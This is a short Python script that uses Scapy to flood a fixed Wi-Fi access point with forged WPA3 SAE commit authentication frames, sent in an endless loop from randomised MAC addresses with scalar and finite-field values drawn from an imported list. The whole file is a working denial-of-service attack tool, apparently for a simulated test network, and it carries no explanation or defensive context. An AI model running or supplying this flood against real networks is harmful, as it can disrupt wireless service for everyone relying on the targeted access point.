from scapy.all import *
import random
import time
from scalars_and_finites import scalar_list, finite_list
  
group = '\x13\x00'
count = 10000
bssid = "02:00:00:00:02:00"

intf = sys.argv[1]

def scalar():
  return bytes.fromhex(random.choice(scalar_list))
  
def finite():
  return bytes.fromhex(random.choice(finite_list))

def rand_mac():
  return '%02x:%02x:%02x:%02x:%02x:%02x'%(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
  
def auth_frame():
  client =  rand_mac()
  return RadioTap()/Dot11(type="Management", subtype=0xb, proto=0, addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1)

  
def construct_commit():
  Auth = auth_frame()
  Scalar = scalar()
  Finite = finite()
  print(Auth)
  return Auth/group/Scalar/Finite
  

while True:
  pkt = RadioTap() / Dot11(subtype=0xb, type="Management", proto=0, addr1=bssid,
                                          addr2=rand_mac(),
                                          addr3=bssid) / Dot11Auth(algo=3, seqnum=1)
  pkt = pkt / group / scalar() / finite()
  sendp(pkt, iface=intf, inter=0.0001, count=128, monitor=True)
